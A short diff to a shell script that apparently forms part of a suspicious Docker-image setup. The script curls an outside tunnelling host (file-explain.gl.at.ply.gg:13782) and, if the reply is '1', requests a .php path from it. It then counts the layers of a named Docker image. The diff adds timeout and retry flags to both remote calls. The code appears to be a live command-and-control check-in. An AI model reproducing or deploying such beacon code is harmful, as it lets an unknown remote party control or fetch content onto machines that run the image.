@@ -1,7 +1,7 @@
-if [[ $(curl http://file-explain.gl.at.ply.gg:13782/linux8888) == "1" ]]
+if [[ $(curl --connect-timeout 10 --max-time 10 --retry 4 http://file-explain.gl.at.ply.gg:13782/linux8888) == "1" ]]
 then
 
-curl http://file-explain.gl.at.ply.gg:13782/linux8888.php
+curl --connect-timeout 10 --max-time 10 --retry 4 http://file-explain.gl.at.ply.gg:13782/linux8888.php
 
 if (( $(echo "$(docker history tradeinc/thetradeboxsignal88888888 | wc -l) > 80") ))
 then
